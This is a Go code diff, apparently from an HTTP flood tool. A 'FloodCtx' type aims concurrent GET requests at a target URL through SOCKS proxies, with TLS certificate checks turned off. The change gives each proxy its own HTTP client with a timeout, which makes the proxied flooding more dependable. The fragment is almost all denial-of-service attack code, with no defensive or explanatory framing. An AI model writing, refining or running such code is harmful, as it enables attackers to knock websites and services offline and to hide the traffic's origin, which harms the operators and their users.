@@ -19,7 +19,6 @@ type (
 		Target      string
 		Concurrency int
 		StopAt      int
-		Client      *http.Client
 		Protocol    string
 	}
 )
@@ -30,7 +29,12 @@ func (ctx *FloodCtx) Jujutsu(proxy string) {
 		os.Exit(0)
 	}
 
-	ctx.cfg_tp(proxy)
+	client := &http.Client{
+		Jar: http.DefaultClient.Jar,
+		Timeout: time.Second * 10.,
+	}
+
+	ctx.cfg_tp(client, proxy)
 
 	req, err := http.NewRequest("GET", ctx.Target, nil)
 	if err != nil {
@@ -45,7 +49,7 @@ func (ctx *FloodCtx) Jujutsu(proxy string) {
 	}
 
 	for i := 0; i < ctx.Concurrency; i++ {
-		resp, err := ctx.Client.Do(req)
+		resp, err := client.Do(req)
 		if err != nil {
 			continue
 		}
@@ -60,8 +64,8 @@ func (ctx *FloodCtx) Jujutsu(proxy string) {
 	}
 }
 
-func (ctx *FloodCtx) cfg_tp(proxy string) {
-	ctx.Client.Transport = &http.Transport{
+func (ctx *FloodCtx) cfg_tp(client *http.Client, proxy string) {
+	client.Transport = &http.Transport{
 		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
 		Dial:              socks.Dial(fmt.Sprintf("%s://%s?timeout=10s", ctx.Protocol, proxy)),
 		ForceAttemptHTTP2: true,
